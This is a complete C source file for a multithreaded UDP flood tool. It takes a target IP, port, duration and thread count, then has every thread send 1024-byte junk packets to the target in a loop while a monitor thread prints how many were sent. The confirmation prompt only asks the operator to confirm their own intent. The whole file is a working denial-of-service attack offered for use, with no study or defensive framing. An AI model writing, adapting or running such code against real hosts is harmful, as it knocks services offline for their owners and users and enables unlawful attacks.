#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <stdatomic.h>

struct attack_args {
    char *ip;
    int port;
    int duration;
};

atomic_long packets_sent = 0;
atomic_long packets_failed = 0;

void *attack(void *args_ptr) {
    struct attack_args *args = (struct attack_args *)args_ptr;
    char *ip = args->ip;
    int port = args->port;
    int duration = args->duration;

    struct sockaddr_in target_addr;
    char payload[1024];
    memset(payload, 'A', sizeof(payload));

    int sockfd;
    time_t start_time = time(NULL);

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    while (1) {
        time_t now = time(NULL);
        if (now - start_time >= duration)
            break;

        sockfd = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockfd < 0) {
            atomic_fetch_add(&packets_failed, 1);
            continue;
        }

        ssize_t sent = sendto(sockfd, payload, sizeof(payload), 0,
                              (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (sent > 0) {
            atomic_fetch_add(&packets_sent, 1);
        } else {
            atomic_fetch_add(&packets_failed, 1);
        }
        close(sockfd);
    }
    return NULL;
}

void *monitor(void *duration_ptr) {
    int duration = *((int *)duration_ptr);
    time_t start_time = time(NULL);
    while (1) {
        sleep(10);
        time_t now = time(NULL);
        if (now - start_time >= duration)
            break;

        long sent = atomic_load(&packets_sent);
        long failed = atomic_load(&packets_failed);
        long total = sent + failed;
        float success_rate = total > 0 ? (sent * 100.0f / total) : 0;

        printf("[+] Time: %lds | Packets Sent: %ld | Failed: %ld | Success: %.2f%%\n",
               now - start_time, sent, failed, success_rate);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return 1;
    }

    struct attack_args args = {argv[1], atoi(argv[2]), atoi(argv[3])};
    int threads_num = atoi(argv[4]);

    // Consent to start attack
    char consent[3];
    printf("Are you sure you want to start the attack on IP: %s, Port: %d for %d seconds with %d threads? (yes/no): ",
           args.ip, args.port, args.duration, threads_num);
    fgets(consent, sizeof(consent), stdin);

    if (strncmp(consent, "yes", 3) != 0) {
        printf("[!] Attack aborted by user.\n");
        return 0;
    }

    // Attack starts immediately after consent, with countdown display
    for (int i = 5; i > 0; i--) {
        printf("[+] Starting attack in %d seconds...\n", i);
        sleep(1);
    }

    // Start monitor thread
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, monitor, &args.duration);

    // Launch flooder threads
    pthread_t *threads = malloc(threads_num * sizeof(pthread_t));
    if (!threads) {
        perror("Malloc failed");
        return 1;
    }

    // Launch attack immediately after countdown
    printf("[+] Attack has started!\n");
    for (int i = 0; i < threads_num; i++) {
        if (pthread_create(&threads[i], NULL, attack, &args) != 0) {
            perror("Thread creation failed");
            return 1;
        }
    }

    // Wait for attack threads to finish
    for (int i = 0; i < threads_num; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_join(monitor_thread, NULL);
    free(threads);

    printf("\n[✓] Attack complete.\n");
    printf("Total Packets Sent: %ld | Failed: %ld\n", atomic_load(&packets_sent), atomic_load(&packets_failed));
    return 0;
}
